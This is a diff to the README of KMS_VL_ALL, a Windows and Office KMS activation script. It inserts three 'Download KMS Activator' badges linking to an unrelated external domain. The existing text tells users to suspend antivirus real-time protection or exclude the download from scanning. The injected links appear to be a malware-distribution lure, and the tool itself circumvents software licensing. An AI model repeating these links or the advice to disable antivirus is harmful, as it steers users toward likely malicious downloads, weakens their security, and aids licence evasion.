@@ -1,6 +1,11 @@
 # KMS_VL_ALL - Smart Activation Script (Version 44)
 
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-ffdd00?style=for-the-badge&logo=office)](https://1cinsight.pro/)
+
 ## Supported Volume Products:  
+
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-800080?style=for-the-badge&logo=microsoft)](https://1cinsight.pro/)
+
 [see here](https://github.com/lixuy/vlmcsd#valid-apps)
 >Server/Windows  
 https://docs.microsoft.com/en-us/windows-server/get-started/kmsclientkeys  
@@ -13,6 +18,9 @@ https://technet.microsoft.com/en-us/library/ee624355(v=office.14).aspx
 *Office Retail must be [converted](https://github.com/kkkgo/office-C2R-to-VOL) to Volume first, before it can be activated with KMS.  
 KMS activation on Windows 7 have a limitation related to SLIC 2.1 and Windows marker
 ## How To Use:
+
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-bdbdbd?style=for-the-badge&logo=office)](https://1cinsight.pro/)
+
 >Remove any other KMS solutions.  
 Temporary suspend Antivirus realtime protection, or exclude the downloaded file and extracted folder from scanning to avoid quarantine.  
 Extract the downloaded file contents to a simple path without special characters or long spaces.  
